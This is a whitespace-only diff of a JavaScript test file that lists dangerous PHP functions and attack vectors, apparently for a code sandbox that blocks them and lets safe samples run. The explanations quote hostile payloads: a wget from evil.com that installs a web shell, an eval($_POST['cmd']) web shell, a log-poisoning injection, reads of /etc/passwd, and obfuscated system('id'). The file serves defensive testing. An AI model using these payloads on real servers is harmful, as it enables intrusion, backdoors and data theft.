@@ -1,9 +1,9 @@
 /**
  * PHP Security Attack Vectors
- * 
+ *
  * PHP is widely used for web applications and has many dangerous functions
  * that can lead to Remote Code Execution (RCE) and data theft.
- * 
+ *
  * Each test includes:
  * - name: Test identifier
  * - code: The malicious code attempt
@@ -23,16 +23,16 @@ export const phpTests = [
     category: 'command_execution',
     explanation: `
       🎯 ATTACK: Direct System Command Execution
-      
+
       How hackers use this:
       system() executes a shell command and displays the output.
       It's one of the most common PHP RCE vectors.
-      
+
       Real-world impact:
       - Execute any command with web server privileges
       - system('cat /etc/passwd') reveals user accounts
       - system('wget evil.com/shell.php -O shell.php') installs backdoors
-      
+
       Historical note:
       Countless web shell exploits start with system() calls.
       It's in the top 5 most dangerous PHP functions.
@@ -45,11 +45,11 @@ export const phpTests = [
     category: 'command_execution',
     explanation: `
       🎯 ATTACK: Command Execution with Output Capture
-      
+
       How hackers use this:
       exec() runs a command and captures output into an array.
       Attackers use it to enumerate files and extract data.
-      
+
       Real-world impact:
       - Capture command output for processing
       - Array output is easier to parse
@@ -63,11 +63,11 @@ export const phpTests = [
     category: 'command_execution',
     explanation: `
       🎯 ATTACK: Shell Command with String Output
-      
+
       How hackers use this:
       shell_exec() returns command output as a single string.
       Equivalent to backtick operator.
-      
+
       Real-world impact:
       - Simple output capture
       - Easy to echo directly
@@ -81,11 +81,11 @@ export const phpTests = [
     category: 'command_execution',
     explanation: `
       🎯 ATTACK: Raw Command Output Passthrough
-      
+
       How hackers use this:
       passthru() passes command output directly to the browser.
       Useful for binary output or large data streams.
-      
+
       Real-world impact:
       - Stream files directly to attacker
       - No memory buffering issues
@@ -99,11 +99,11 @@ export const phpTests = [
     category: 'command_execution',
     explanation: `
       🎯 ATTACK: Process Pipe Open
-      
+
       How hackers use this:
       popen() opens a pipe to a process for reading or writing.
       Enables interactive command communication.
-      
+
       Real-world impact:
       - Stream data to/from processes
       - Interactive shell communication
@@ -117,11 +117,11 @@ export const phpTests = [
     category: 'command_execution',
     explanation: `
       🎯 ATTACK: Full Process Control
-      
+
       How hackers use this:
       proc_open() provides complete control over process I/O.
       Most powerful process execution function in PHP.
-      
+
       Real-world impact:
       - Control stdin, stdout, stderr separately
       - Create interactive shells
@@ -135,11 +135,11 @@ export const phpTests = [
     category: 'command_execution',
     explanation: `
       🎯 ATTACK: Process Control Execution
-      
+
       How hackers use this:
       pcntl_exec() replaces the current process with a new one.
       Part of the pcntl extension for Unix process control.
-      
+
       Real-world impact:
       - Replace PHP process with shell
       - Execute binaries directly
@@ -153,11 +153,11 @@ export const phpTests = [
     category: 'command_execution',
     explanation: `
       🎯 ATTACK: Backtick Command Execution
-      
+
       How hackers use this:
       Backticks are a shorthand for shell_exec().
       Less obvious than function calls.
-      
+
       Real-world impact:
       - Subtle command execution
       - Often missed in code review
@@ -171,11 +171,11 @@ export const phpTests = [
     category: 'command_execution',
     explanation: `
       🎯 ATTACK: Expect Extension Process Control
-      
+
       How hackers use this:
       The expect extension can spawn interactive processes.
       Used for automation but dangerous in web contexts.
-      
+
       Real-world impact:
       - Spawn interactive shells
       - Automate system interactions
@@ -193,16 +193,16 @@ export const phpTests = [
     category: 'code_injection',
     explanation: `
       🎯 ATTACK: Dynamic Code Execution
-      
+
       How hackers use this:
       eval() executes a string as PHP code.
       The most dangerous PHP function for RCE.
-      
+
       Real-world impact:
       - Execute any PHP code from strings
       - Web shells use eval($_POST['cmd'])
       - Bypass any input filters
-      
+
       Famous exploits:
       Many WordPress/Joomla exploits use eval injection
     `,
@@ -214,11 +214,11 @@ export const phpTests = [
     category: 'code_injection',
     explanation: `
       🎯 ATTACK: Assert Code Execution (PHP < 8)
-      
+
       How hackers use this:
       In PHP < 8, assert() with a string argument executes it as code.
       Often overlooked as a security risk.
-      
+
       Real-world impact:
       - Eval alternative that may bypass filters
       - Works in older PHP versions
@@ -232,11 +232,11 @@ export const phpTests = [
     category: 'code_injection',
     explanation: `
       🎯 ATTACK: Dynamic Function Creation
-      
+
       How hackers use this:
       create_function() builds functions from strings (like eval).
       Deprecated but still works in many environments.
-      
+
       Real-world impact:
       - Create and execute malicious functions
       - Bypass eval() blocking
@@ -250,11 +250,11 @@ export const phpTests = [
     category: 'code_injection',
     explanation: `
       🎯 ATTACK: Regex Eval Modifier
-      
+
       How hackers use this:
       The /e modifier (deprecated) evaluates the replacement as PHP.
       Classic PHP vulnerability vector.
-      
+
       Real-world impact:
       - Execute code in regex replacements
       - Many old exploits use this
@@ -268,11 +268,11 @@ export const phpTests = [
     category: 'code_injection',
     explanation: `
       🎯 ATTACK: Regex Callback Execution
-      
+
       How hackers use this:
       preg_replace_callback() calls a function for each match.
       The callback can contain malicious code.
-      
+
       Real-world impact:
       - Execute code for each regex match
       - Modern alternative to /e modifier
@@ -286,11 +286,11 @@ export const phpTests = [
     category: 'code_injection',
     explanation: `
       🎯 ATTACK: Dynamic Function Call
-      
+
       How hackers use this:
       call_user_func() calls any function by name.
       Enables calling dangerous functions dynamically.
-      
+
       Real-world impact:
       - Call any function by string name
       - Bypass direct function name filters
@@ -304,11 +304,11 @@ export const phpTests = [
     category: 'code_injection',
     explanation: `
       🎯 ATTACK: Dynamic Function Call with Array Args
-      
+
       How hackers use this:
       call_user_func_array() passes arguments as an array.
       Useful for variable argument counts.
-      
+
       Real-world impact:
       - Same as call_user_func with array arguments
       - More flexible for complex payloads
@@ -321,11 +321,11 @@ export const phpTests = [
     category: 'code_injection',
     explanation: `
       🎯 ATTACK: Array Function Callback Abuse
-      
+
       How hackers use this:
       array_map() applies a callback to each array element.
       Using 'system' as callback executes commands.
-      
+
       Real-world impact:
       - Execute commands for each array element
       - Less obvious than direct system() call
@@ -339,11 +339,11 @@ export const phpTests = [
     category: 'code_injection',
     explanation: `
       🎯 ATTACK: Array Filter Callback Abuse
-      
+
       How hackers use this:
       array_filter() can use a callback for filtering.
       Using 'system' executes each element as a command.
-      
+
       Real-world impact:
       - Same pattern as array_map abuse
       - Commands in array are executed
@@ -357,11 +357,11 @@ export const phpTests = [
     category: 'code_injection',
     explanation: `
       🎯 ATTACK: Array Walk Callback Abuse
-      
+
       How hackers use this:
       array_walk() applies callback to each element in place.
       Another array function abusable for code execution.
-      
+
       Real-world impact:
       - Similar to array_map
       - Modifies array in place
@@ -375,11 +375,11 @@ export const phpTests = [
     category: 'code_injection',
     explanation: `
       🎯 ATTACK: Array Reduce Callback Abuse
-      
+
       How hackers use this:
       array_reduce() with a malicious callback executes
       code while appearing to do array reduction.
-      
+
       Real-world impact:
       - Hide execution in reduction logic
       - Appears to be data processing
@@ -393,11 +393,11 @@ export const phpTests = [
     category: 'code_injection',
     explanation: `
       🎯 ATTACK: Sort Callback Abuse
-      
+
       How hackers use this:
       Sorting functions accept comparison callbacks.
       Malicious callbacks execute during sort operations.
-      
+
       Real-world impact:
       - Execute during sort comparison
       - Very subtle attack vector
@@ -411,11 +411,11 @@ export const phpTests = [
     category: 'code_injection',
     explanation: `
       🎯 ATTACK: Associative Sort Callback Abuse
-      
+
       How hackers use this:
       uasort() maintains key associations while sorting.
       Same callback abuse as usort().
-      
+
       Real-world impact:
       - Same as usort
       - Preserves array keys
@@ -429,11 +429,11 @@ export const phpTests = [
     category: 'code_injection',
     explanation: `
       🎯 ATTACK: Key Sort Callback Abuse
-      
+
       How hackers use this:
       uksort() sorts by keys using a callback.
       Callback abuse works here too.
-      
+
       Real-world impact:
       - Sort by keys with code execution
       - Complete set of sort function abuse
@@ -446,11 +446,11 @@ export const phpTests = [
     category: 'code_injection',
     explanation: `
       🎯 ATTACK: Shutdown Handler Registration
-      
+
       How hackers use this:
       Register a function to run when PHP shuts down.
       Malicious handlers persist until script ends.
-      
+
       Real-world impact:
       - Execute code at script termination
       - Guaranteed execution even on errors
@@ -464,11 +464,11 @@ export const phpTests = [
     category: 'code_injection',
     explanation: `
       🎯 ATTACK: Tick Function Registration
-      
+
       How hackers use this:
       Tick functions run every N statements.
       Can execute code repeatedly during execution.
-      
+
       Real-world impact:
       - Repeated code execution
       - Monitoring/interception capabilities
@@ -486,11 +486,11 @@ export const phpTests = [
     category: 'file_system',
     explanation: `
       🎯 ATTACK: File Content Reading
-      
+
       How hackers use this:
       file_get_contents() reads entire files into strings.
       Most common file reading function in PHP.
-      
+
       Real-world impact:
       - Read /etc/passwd for user enumeration
       - Access application source code
@@ -505,11 +505,11 @@ export const phpTests = [
     category: 'file_system',
     explanation: `
       🎯 ATTACK: File Writing / Web Shell Creation
-      
+
       How hackers use this:
       file_put_contents() writes data to files.
       Primary method for creating web shells.
-      
+
       Real-world impact:
       - Create PHP web shells
       - Modify existing PHP files
@@ -524,11 +524,11 @@ export const phpTests = [
     category: 'file_system',
     explanation: `
       🎯 ATTACK: File Line Reading
-      
+
       How hackers use this:
       file() reads a file into an array of lines.
       Easy to process file contents.
-      
+
       Real-world impact:
       - Read files as arrays
       - Process line by line
@@ -542,11 +542,11 @@ export const phpTests = [
     category: 'file_system',
     explanation: `
       🎯 ATTACK: Low-Level File Operations
-      
+
       How hackers use this:
       fopen/fread provide fine-grained file access.
       Can read specific portions of files.
-      
+
       Real-world impact:
       - Streaming file access
       - Read large files in chunks
@@ -560,11 +560,11 @@ export const phpTests = [
     category: 'file_system',
     explanation: `
       🎯 ATTACK: Direct File Output
-      
+
       How hackers use this:
       readfile() outputs a file directly to the browser.
       No buffering, efficient for large files.
-      
+
       Real-world impact:
       - Stream files to attacker
       - No memory buffering
@@ -578,11 +578,11 @@ export const phpTests = [
     category: 'file_system',
     explanation: `
       🎯 ATTACK: Local File Inclusion (LFI)
-      
+
       How hackers use this:
       include() loads and executes a PHP file.
       With non-PHP files, content is displayed.
-      
+
       Real-world impact:
       - LFI to RCE via log poisoning
       - Read sensitive files
@@ -597,11 +597,11 @@ export const phpTests = [
     category: 'file_system',
     explanation: `
       🎯 ATTACK: Log Poisoning LFI
-      
+
       How hackers use this:
       Include log files that contain attacker-controlled content.
       If PHP code was injected into logs, it executes.
-      
+
       Real-world impact:
       - Classic LFI to RCE technique
       - Inject <?php system($_GET[c])?> via User-Agent
@@ -615,11 +615,11 @@ export const phpTests = [
     category: 'file_system',
     explanation: `
       🎯 ATTACK: Required File Inclusion
-      
+
       How hackers use this:
       require() is like include() but fatal on failure.
       Same LFI vulnerability pattern.
-      
+
       Real-world impact:
       - Same as include() attacks
       - Script dies if file not found
@@ -633,11 +633,11 @@ export const phpTests = [
     category: 'file_system',
     explanation: `
       🎯 ATTACK: Directory Enumeration
-      
+
       How hackers use this:
       scandir() lists directory contents.
       Essential for mapping the file system.
-      
+
       Real-world impact:
       - Discover file structure
       - Find config files, backups
@@ -651,11 +651,11 @@ export const phpTests = [
     category: 'file_system',
     explanation: `
       🎯 ATTACK: Pattern-Based File Discovery
-      
+
       How hackers use this:
       glob() finds files matching patterns.
       Powerful for discovering specific file types.
-      
+
       Real-world impact:
       - Find all .php files: glob('*.php')
       - Find config: glob('/etc/*.conf')
@@ -669,11 +669,11 @@ export const phpTests = [
     category: 'file_system',
     explanation: `
       🎯 ATTACK: Source Code Disclosure
-      
+
       How hackers use this:
       show_source() displays PHP files with syntax highlighting.
       Reveals application source code.
-      
+
       Real-world impact:
       - Read PHP source code
       - Find hardcoded credentials
@@ -688,11 +688,11 @@ export const phpTests = [
     category: 'file_system',
     explanation: `
       🎯 ATTACK: Syntax Highlighted Source Disclosure
-      
+
       How hackers use this:
       highlight_file() is alias of show_source().
       Commonly targeted for WordPress configs.
-      
+
       Real-world impact:
       - WordPress database credentials
       - Displayed in formatted HTML
@@ -706,11 +706,11 @@ export const phpTests = [
     category: 'file_system',
     explanation: `
       🎯 ATTACK: File Upload Bypass
-      
+
       How hackers use this:
       move_uploaded_file() moves uploaded files.
       Can be abused to place web shells.
-      
+
       Real-world impact:
       - Move uploaded shell to web directory
       - Bypass upload validation
@@ -724,11 +724,11 @@ export const phpTests = [
     category: 'file_system',
     explanation: `
       🎯 ATTACK: File Copying
-      
+
       How hackers use this:
       copy() duplicates files to new locations.
       Move sensitive files to accessible locations.
-      
+
       Real-world impact:
       - Copy sensitive files to web root
       - Make private files publicly accessible
@@ -742,11 +742,11 @@ export const phpTests = [
     category: 'file_system',
     explanation: `
       🎯 ATTACK: File Deletion
-      
+
       How hackers use this:
       unlink() deletes files.
       Destructive attack or evidence removal.
-      
+
       Real-world impact:
       - Delete application files
       - Remove logs to cover tracks
@@ -760,11 +760,11 @@ export const phpTests = [
     category: 'file_system',
     explanation: `
       🎯 ATTACK: Symlink Attack
-      
+
       How hackers use this:
       symlink() creates symbolic links.
       Link sensitive files to accessible locations.
-      
+
       Real-world impact:
       - Expose /etc/passwd via web server
       - Bypass directory restrictions
@@ -782,11 +782,11 @@ export const phpTests = [
     category: 'network',
     explanation: `
       🎯 ATTACK: Raw Socket Connection
-      
+
       How hackers use this:
       fsockopen() creates network connections.
       Used for reverse shells and data exfiltration.
-      
+
       Real-world impact:
       - Reverse shell connections
       - HTTP requests to C2 servers
@@ -801,11 +801,11 @@ export const phpTests = [
     category: 'network',
     explanation: `
       🎯 ATTACK: Persistent Socket Connection
-      
+
       How hackers use this:
       pfsockopen() creates persistent connections.
       Maintained across requests for efficiency.
-      
+
       Real-world impact:
       - Long-lived connections to attackers
       - Efficient repeated communication
@@ -819,11 +819,11 @@ export const phpTests = [
     category: 'network',
     explanation: `
       🎯 ATTACK: cURL HTTP Requests
-      
+
       How hackers use this:
       cURL is powerful for HTTP requests.
       Can exfiltrate data or download payloads.
-      
+
       Real-world impact:
       - Send stolen data to attacker
       - Download malware
@@ -838,11 +838,11 @@ export const phpTests = [
     category: 'network',
     explanation: `
       🎯 ATTACK: Stream Socket Client
-      
+
       How hackers use this:
       stream_socket_client() is a modern socket API.
       Supports TCP, UDP, and Unix sockets.
-      
+
       Real-world impact:
       - Alternative to fsockopen
       - More protocol options
@@ -856,11 +856,11 @@ export const phpTests = [
     category: 'network',
     explanation: `
       🎯 ATTACK: Socket Server Creation
-      
+
       How hackers use this:
       Creates a listening socket server.
       Can receive incoming connections.
-      
+
       Real-world impact:
       - Create backdoor listeners
       - Bind shell for remote access
@@ -874,11 +874,11 @@ export const phpTests = [
     category: 'network',
     explanation: `
       🎯 ATTACK: FTP Connection
-      
+
       How hackers use this:
       FTP functions enable file transfers.
       Exfiltrate files or download malware.
-      
+
       Real-world impact:
       - Upload stolen files
       - Download additional tools
@@ -892,11 +892,11 @@ export const phpTests = [
     category: 'network',
     explanation: `
       🎯 ATTACK: Email Data Exfiltration
-      
+
       How hackers use this:
       mail() sends emails, potentially with stolen data.
       Can also be used for spam.
-      
+
       Real-world impact:
       - Email sensitive files
       - Header injection attacks
@@ -910,11 +910,11 @@ export const phpTests = [
     category: 'network',
     explanation: `
       🎯 ATTACK: Stream-Based URL Fetching
-      
+
       How hackers use this:
       Streams can open URLs like files.
       Alternative to cURL/file_get_contents.
-      
+
       Real-world impact:
       - Download remote content
       - SSRF attacks
@@ -932,11 +932,11 @@ export const phpTests = [
     category: 'superglobal_access',
     explanation: `
       🎯 ATTACK: Environment Variable Access
-      
+
       How hackers use this:
       $_ENV contains environment variables with
       potentially sensitive configuration.
-      
+
       Real-world impact:
       - Read API keys
       - Database credentials
@@ -951,11 +951,11 @@ export const phpTests = [
     category: 'superglobal_access',
     explanation: `
       🎯 ATTACK: Server Information Disclosure
-      
+
       How hackers use this:
       $_SERVER contains server and request information.
       Useful for reconnaissance.
-      
+
       Real-world impact:
       - Reveal server paths
       - Document root location
@@ -970,11 +970,11 @@ export const phpTests = [
     category: 'superglobal_access',
     explanation: `
       🎯 ATTACK: Environment Variable Reading
-      
+
       How hackers use this:
       getenv() reads specific environment variables.
       Targeted access to known secrets.
-      
+
       Real-world impact:
       - Read specific credentials
       - Check for specific environment
@@ -988,11 +988,11 @@ export const phpTests = [
     category: 'superglobal_access',
     explanation: `
       🎯 ATTACK: Environment Variable Manipulation
-      
+
       How hackers use this:
       putenv() modifies environment variables.
       Can enable exploitation of other vulnerabilities.
-      
+
       Real-world impact:
       - LD_PRELOAD injection for RCE
       - Modify PATH for command hijacking
@@ -1006,11 +1006,11 @@ export const phpTests = [
     category: 'superglobal_access',
     explanation: `
       🎯 ATTACK: Apache Environment Access
-      
+
       How hackers use this:
       Apache-specific environment access.
       May contain additional server info.
-      
+
       Real-world impact:
       - Apache-specific variables
       - Additional reconnaissance data
@@ -1024,11 +1024,11 @@ export const phpTests = [
     category: 'superglobal_access',
     explanation: `
       🎯 ATTACK: Apache Environment Manipulation
-      
+
       How hackers use this:
       Set Apache environment variables.
       Can affect request processing.
-      
+
       Real-world impact:
       - Modify Apache behavior
       - Affect downstream processing
@@ -1042,11 +1042,11 @@ export const phpTests = [
     category: 'superglobal_access',
     explanation: `
       🎯 ATTACK: Full PHP Configuration Disclosure
-      
+
       How hackers use this:
       phpinfo() reveals complete PHP configuration.
       Gold mine for attackers planning exploits.
-      
+
       Real-world impact:
       - PHP version and modules
       - Server paths
@@ -1061,11 +1061,11 @@ export const phpTests = [
     category: 'superglobal_access',
     explanation: `
       🎯 ATTACK: PHP Configuration Reading
-      
+
       How hackers use this:
       ini_get() reads PHP configuration values.
       Reveals security restrictions and settings.
-      
+
       Real-world impact:
       - Check disable_functions
       - Find open_basedir restrictions
@@ -1079,11 +1079,11 @@ export const phpTests = [
     category: 'superglobal_access',
     explanation: `
       🎯 ATTACK: PHP Configuration Modification
-      
+
       How hackers use this:
       ini_set() modifies PHP settings at runtime.
       Can weaken security configurations.
-      
+
       Real-world impact:
       - Enable error display for info leak
       - Modify memory limits
@@ -1101,11 +1101,11 @@ export const phpTests = [
     category: 'encoding_bypass',
     explanation: `
       🎯 ATTACK: Base64 Encoded Payload
-      
+
       How hackers use this:
       Base64 hides malicious code from filters.
       'c3lzdGVtKCdpZCcp' decodes to system('id').
-      
+
       Real-world impact:
       - Bypass string pattern filters
       - Common in web shells
@@ -1119,11 +1119,11 @@ export const phpTests = [
     category: 'encoding_bypass',
     explanation: `
       🎯 ATTACK: Character Code Function Name
-      
+
       How hackers use this:
       Build function names from chr() codes.
       chr(115).chr(121)... = 'system'.
-      
+
       Real-world impact:
       - Bypass function name filters
       - Dynamic function construction
@@ -1137,11 +1137,11 @@ export const phpTests = [
     category: 'encoding_bypass',
     explanation: `
       🎯 ATTACK: Hex Encoded Function Name
-      
+
       How hackers use this:
       hex2bin() converts hex to binary/string.
       '73797374656d' = 'system' in hex.
-      
+
       Real-world impact:
       - Alternative to base64
       - Less suspicious encoding
@@ -1155,11 +1155,11 @@ export const phpTests = [
     category: 'encoding_bypass',
     explanation: `
       🎯 ATTACK: Pack Function for Encoding
-      
+
       How hackers use this:
       pack() converts data between formats.
       Can construct strings from various encodings.
-      
+
       Real-world impact:
       - Flexible encoding/decoding
       - Multiple format options
@@ -1173,11 +1173,11 @@ export const phpTests = [
     category: 'encoding_bypass',
     explanation: `
       🎯 ATTACK: ROT13 Obfuscation
-      
+
       How hackers use this:
       str_rot13() is a simple letter substitution.
       'flfgrz' in ROT13 = 'system'.
-      
+
       Real-world impact:
       - Simple but effective obfuscation
       - Easy to implement and reverse
@@ -1191,11 +1191,11 @@ export const phpTests = [
     category: 'encoding_bypass',
     explanation: `
       🎯 ATTACK: Compressed Payload
-      
+
       How hackers use this:
       gzinflate() decompresses data.
       Combined with base64, hides large payloads.
-      
+
       Real-world impact:
       - Smaller encoded payloads
       - Harder to analyze
@@ -1209,11 +1209,11 @@ export const phpTests = [
     category: 'encoding_bypass',
     explanation: `
       🎯 ATTACK: UUEncode Obfuscation
-      
+
       How hackers use this:
       UUencode is an older encoding format.
       May bypass filters checking common encodings.
-      
+
       Real-world impact:
       - Alternative encoding method
       - Less commonly filtered
@@ -1232,7 +1232,7 @@ export const phpTests = [
     category: 'safe_code',
     explanation: `
       ✅ SAFE: Basic Output
-      
+
       This is legitimate code that should execute:
       echo is fundamental for PHP output and
       poses no security risk.
@@ -1246,7 +1246,7 @@ export const phpTests = [
     category: 'safe_code',
     explanation: `
       ✅ SAFE: Mathematical Operations
-      
+
       This is legitimate code that should execute:
       Basic arithmetic is essential for any programming.
     `,
@@ -1259,7 +1259,7 @@ export const phpTests = [
     category: 'safe_code',
     explanation: `
       ✅ SAFE: Array Operations with foreach
-      
+
       This is legitimate code that should execute:
       Using foreach loops for array transformation is safe.
       Array callback functions like array_map are blocked
@@ -1285,7 +1285,7 @@ echo $p->x + $p->y;
     category: 'safe_code',
     explanation: `
       ✅ SAFE: Object-Oriented PHP
-      
+
       This is legitimate code that should execute:
       Class definitions and object instantiation
       are core PHP functionality.
@@ -1299,7 +1299,7 @@ echo $p->x + $p->y;
     category: 'safe_code',
     explanation: `
       ✅ SAFE: String Manipulation
-      
+
       This is legitimate code that should execute:
       String functions for formatting and
       manipulation are safe and commonly used.
